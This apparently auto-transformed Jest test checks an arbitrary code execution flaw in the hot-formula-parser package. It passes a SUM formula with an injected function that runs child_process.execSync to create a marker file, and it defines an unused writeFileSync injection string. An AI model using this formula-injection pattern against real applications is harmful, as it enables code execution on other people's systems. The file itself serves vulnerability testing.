const v23 = () => {
    const v13 = expect.assertions(2);
    v13;
    const fs = require('fs');
    const v14 = require('hot-formula-parser');
    const FormulaParser = v14.Parser;
    const path = './hot-formula-parser';
    const v15 = 'red(); require(\'fs\').writeFileSync(\'' + path;
    let payload = v15 + '\',``); //';
    data = {};
    file_exist = fs.existsSync(path);
    const v16 = expect(file_exist);
    const v17 = v16.toBe(false);
    v17;
    try {
        let parser = new FormulaParser();
        const v18 = parser.parse('SUM([(function(){require(\'child_process\').execSync(\'touch hot-formula-parser\')})(),2])');
        v18;
    } catch (error) {
    }
    file_exist = fs.existsSync(path);
    const v19 = expect(file_exist);
    const v20 = v19.toBe(true);
    v20;
    const v21 = function (err) {
    };
    const v22 = fs.unlink(path, v21);
    v22;
};
const v24 = test('Arbitrary code execution in hot-formula-parser', v23);
v24;